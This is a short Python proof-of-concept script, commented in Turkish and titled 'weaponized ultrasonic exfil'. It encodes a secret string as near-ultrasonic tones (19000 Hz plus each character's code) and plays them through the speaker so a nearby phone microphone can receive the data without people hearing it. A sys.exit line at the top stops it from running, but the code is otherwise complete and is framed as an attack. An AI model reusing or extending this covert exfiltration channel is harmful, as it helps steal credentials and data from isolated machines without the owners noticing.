import winsound
import time
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Ultrasonik veri aktarımı konseptidir.")

print("--- WEAPONIZED ULTRASONIC EXFIL ---")

def transmit_data(data):
    print("[*] Veri Ultrasonik frekansa modüle ediliyor...")
    
    for char in data:
        # 1. FREKANS DEĞİŞİMİ (Weaponized Part)
        # Simülasyonda: 1000 Hz (Duyulabilir)
        # Gerçekte: 18000 Hz - 20000 Hz arası (Ultrasonik)
        
        # Basit Modülasyon: ASCII değerini frekansa çevir
        # Örn: 'A' (65) -> 19065 Hz
        freq = 19000 + ord(char)
        
        # Sesi Çal (İnsan kulağı duymaz, ama akıllı telefon mikrofonu duyar)
        winsound.Beep(freq, 200) # 200ms
        time.sleep(0.05)

    print("💀 VERİ AKTARILDI (SESSİZ).")

if __name__ == "__main__":
    secret = "PASSWORD123"
    transmit_data(secret)